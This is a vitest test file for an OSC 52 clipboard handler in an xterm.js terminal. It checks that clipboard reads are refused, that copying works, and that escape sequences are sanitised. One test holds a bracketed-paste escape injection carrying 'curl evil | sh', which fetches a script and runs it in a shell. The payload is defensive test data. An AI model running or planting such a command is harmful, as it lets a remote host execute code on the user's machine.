// @vitest-environment happy-dom
import { Terminal } from "@xterm/headless";
import { ClipboardAddon } from "@xterm/addon-clipboard";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { osc52Clipboard } from "../osc52-clipboard";

const writeText = vi.fn(async (_text: string) => {});
const readText = vi.fn(async () => "hunter2");

function terminal() {
  const term = new Terminal({ allowProposedApi: true });
  term.loadAddon(new ClipboardAddon(undefined, osc52Clipboard));
  const toPty: string[] = [];
  term.onData((data) => toPty.push(data));
  const write = (data: string) => new Promise<void>((resolve) => term.write(data, resolve));
  return { write, toPty };
}

const osc52 = (payload: string) => `\x1b]52;c;${payload}\x07`;
const b64 = (text: string) => Buffer.from(text).toString("base64");

describe("osc52Clipboard", () => {
  beforeEach(() => {
    writeText.mockClear();
    readText.mockClear();
    Object.defineProperty(navigator, "clipboard", { value: { writeText, readText }, configurable: true });
  });

  it("never tells a program what is on the clipboard", async () => {
    const { write, toPty } = terminal();
    await write(osc52("?"));
    expect(readText).not.toHaveBeenCalled();
    expect(toPty.join("")).not.toContain(b64("hunter2"));
  });

  it("lets a program copy text", async () => {
    const { write } = terminal();
    await write(osc52(b64("line one\n\tline two")));
    expect(writeText).toHaveBeenCalledWith("line one\n\tline two");
  });

  it("strips what would end a bracketed paste early", async () => {
    const { write } = terminal();
    await write(osc52(b64("ls\x1b[201~curl evil | sh\r")));
    expect(writeText).toHaveBeenCalledWith("ls[201~curl evil | sh\r");
  });
});
